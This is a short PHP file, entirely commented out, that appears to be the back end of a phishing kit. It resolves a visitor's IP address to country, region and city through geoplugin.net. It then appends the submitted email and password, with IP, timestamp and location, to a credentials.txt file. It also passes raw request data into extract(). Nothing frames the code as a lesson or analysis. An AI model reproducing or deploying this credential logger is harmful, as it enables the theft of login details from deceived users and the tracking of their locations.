<?php
//     $xml = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".getRealIpAddr());
//     echo $xml->geoplugin_countryName ;
    
    
//     echo "<pre>";
//     foreach ($xml as $key => $value)
//     {
//         echo $key , "= " , $value ,  " \n" ;
//     }
//     echo "</pre>";

//     function getRealIpAddr()
// {
//     if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
//     {
//       $ip=$_SERVER['HTTP_CLIENT_IP'];
//     }
//     elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
//     {
//       $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
//     }
//     else
//     {
//       $ip=$_SERVER['REMOTE_ADDR'];
//     }
//     return $ip;
// }


    // Get a Visitor Location Details using IP Address PHP Function
// function getLocationByIp(){  
//     $client_ip  = @$_SERVER['HTTP_CLIENT_IP'];
//     $forward_ip = @$_SERVER['HTTP_X_FORWARDED_FOR'];
//     $remote_ip  = @$_SERVER['REMOTE_ADDR'];
//     $result  = array('countryCode'=>'', 'countryName'=>'', 'region'=>'', 'city'=>'');
//     if(filter_var($client_ip, FILTER_VALIDATE_IP)){
//         $ip_address = $client_ip;
//     }elseif(filter_var($forward_ip, FILTER_VALIDATE_IP)){
//         $ip_address = $forward_ip;
//     }else{
//         $ip_address = $remote_ip;
//     }
//     $loc_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip_address));    
//     if($loc_data && $loc_data->geoplugin_countryName != null){
//         $result['countryCode'] = $loc_data->geoplugin_countryCode;
//         $result['countryName'] = $loc_data->geoplugin_countryName;
//         $result['region'] = $loc_data->geoplugin_region;
//         $result['city'] = $loc_data->geoplugin_city;
//     }else{
//         $result['countryCode'] = 'US';
//     }
//     return $result;
// }

// $loc = getLocationByIp();
// $countryCode = $loc['countryCode'];
// $countryCode2 = $loc['countryName'];
// $countryCode3 = $loc['region'];
// $countryCode4 = $loc['city'];

//     extract($_REQUEST);
//     $ip=$_SERVER['REMOTE_ADDR'];
//     $file=fopen("../credentials.txt","a");
//     date_default_timezone_set('Asia/Jakarta');
//     fwrite($file,"Email :");
//     fwrite($file, $email ."\n");
//     fwrite($file,"Password :");
//     fwrite($file, $password ."\n");
//     fwrite($file,"IP Adress :");
//     fwrite($file, $ip ."\n");
//     fwrite($file,"Time Stamp :");
//     fwrite($file, date("Y-m-d H:i:s \n"));
//     fwrite($file,"countryCode :");
//     fwrite($file, $countryCode ."\n");
//     fwrite($file,"ountryName :");
//     fwrite($file, $countryCode2 ."\n");
//     fwrite($file,"region :");
//     fwrite($file, $countryCode3 ."\n");
//     fwrite($file,"city :");
//     fwrite($file, $countryCode4 ."\n\n");
//     fclose($file);
    
//  ?>
